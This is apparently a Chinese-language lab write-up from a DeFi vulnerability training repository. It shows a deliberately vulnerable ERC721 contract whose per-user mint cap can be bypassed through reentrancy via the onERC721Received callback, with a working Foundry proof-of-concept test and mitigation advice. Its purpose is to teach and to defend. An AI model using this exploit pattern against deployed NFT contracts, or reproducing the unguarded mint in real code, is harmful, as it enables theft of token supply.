# 不受保护的回调——ERC721 SafeMint可重入  
[Unprotected-callback.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Unprotected-callback.sol)  
**名称：** 不受保护的回调——ERC721 SafeMint可重入漏洞  
**描述：**  
合约 ContractTest 正在利用回调功能绕过MaxMint721合约设置的最大铸币限制。这是通过触发onERC721Received函数来实现的，在函数内部再次调用Mint函数。因此，尽管MaxMint721试图限制用户可以铸造的代币数量MAX_PER_USER，但ContractTest合约成功铸造的代币数量超过了此限制。  


**场景：**  
这个练习是一个通过回调函数铸造更多的NFT合约。  

**缓解意见：**  
遵循“检查-效果-交互”编码范式并使用OpenZeppelin重入防护。  
**参考：**  
https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a  
https://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code  


**MaxMint721合约：**  
```
contract MaxMint721 is ERC721Enumerable {
    uint256 public MAX_PER_USER = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function mint(uint256 amount) external {
        require(
            balanceOf(msg.sender) + amount <= MAX_PER_USER,
            "exceed max per user"
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 mintIndex = totalSupply();
            _safeMint(msg.sender, mintIndex);
        }
    }
}
```  
**如何测试：**  
forge test --contracts src/test/**Unprotected-callback.sol** -vvvv
```
// 测试新代币铸造的公共函数
function testSafeMint() public {
    // 创建 MaxMint721 合约的新实例
    MaxMint721Contract = new MaxMint721();
        
    // 尝试铸造最大数量的新代币。 
    // 如果 mint 函数以标准方式实现，这应该铸造最大数量的新代币。
    MaxMint721Contract.mint(maxMints);
        
    // 控制台日志表明发生了一个漏洞，允许铸造19个 NFT
    console.log("Bypassed maxMints, we got 19 NFTs");
        
    // 该代码判断确实已经铸造了19个NFT。
    assertEq(MaxMint721Contract.balanceOf(address(this)), 19);
        
    // 输出此合约铸造的NFT数量
    console.log("NFT minted:", MaxMint721Contract.balanceOf(address(this)));
}

// 此函数是ERC721Receiver接口的标准实现，允许该合约从其他合约接收ERC721代币。
// 在这种情况下，它用于执行铸币漏洞
function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
) public returns (bytes4) {
        
    // 检查这是否是第一次调用函数
    if (!complete) {
        // 将函数标记为调用
        complete = true;
            
        // 新代币数量为Mints (maxMints - 1)  
        MaxMint721Contract.mint(maxMints - 1);
            
        // 输出请求铸造的代币数量
        console.log("Called with :", maxMints - 1);
    }
        
    // 这是成功接收ERC721代币的标准返回值
    return this.onERC721Received.selector;
}
```  
**红框：**成功绕过maxMint限制   
![Alt text](image-9.png)
